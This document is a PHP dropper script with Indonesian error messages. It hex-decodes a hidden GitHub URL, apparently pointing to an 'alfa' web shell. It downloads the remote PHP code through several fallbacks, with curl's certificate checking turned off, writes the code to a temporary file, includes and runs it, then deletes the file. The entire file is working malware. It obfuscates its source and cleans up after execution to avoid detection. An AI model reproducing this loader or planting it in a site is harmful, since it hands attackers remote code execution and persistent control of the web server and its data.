<?php
$hexUrl = '68747470733A2F2F7261772E67697468756275736572636F6E74656E742E636F6D2F5041434B444F4C2F7368616C6C6731362F726566732F68656164732F6D61696E2F7368616C6C2D616C6661';
function hex2str($hex) {
    $str = '';
    for ($i = 0; $i < strlen($hex) - 1; $i += 2) {
        $str .= chr(hexdec($hex[$i] . $hex[$i + 1]));
    }
    return $str;
}
$url = hex2str($hexUrl);
function downloadContent($url) {
    if (ini_get('allow_url_fopen')) {
        return file_get_contents($url);
    } elseif (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $data = curl_exec($ch);
        if (curl_errno($ch)) {
            error_log('Curl error: ' . curl_error($ch));
            return false;
        }
        curl_close($ch);
        return $data;
    } else {
        $result = false;
        if ($fp = fopen($url, 'r')) {
            $result = '';
            while ($data = fread($fp, 8192)) {
                $result .= $data;
            }
            fclose($fp);
        }
        return $result;
    }
}
class ScriptHandler {
    private $script;
    public function setScript($script) {
        $this->script = $script;
    }
    public function getScript() {
        $temp = $this->script;
        $this->script = null;
        return $temp;
    }
}
$scriptHandler = new ScriptHandler();
$phpScript = downloadContent($url);
if ($phpScript === false) {
    die("Gagal mendownload script PHP dari URL.");
}
$scriptHandler->setScript($phpScript);
$tempFile = tempnam(sys_get_temp_dir(), 'script_');
if ($tempFile === false) {
    die("Gagal membuat file sementara.");
}
if (file_put_contents($tempFile, $scriptHandler->getScript()) === false) {
    die("Gagal menulis ke file sementara.");
}
include($tempFile);
if (file_exists($tempFile)) {
    unlink($tempFile);
} else {
    error_log("File sementara tidak ditemukan untuk dihapus.");
}
?>
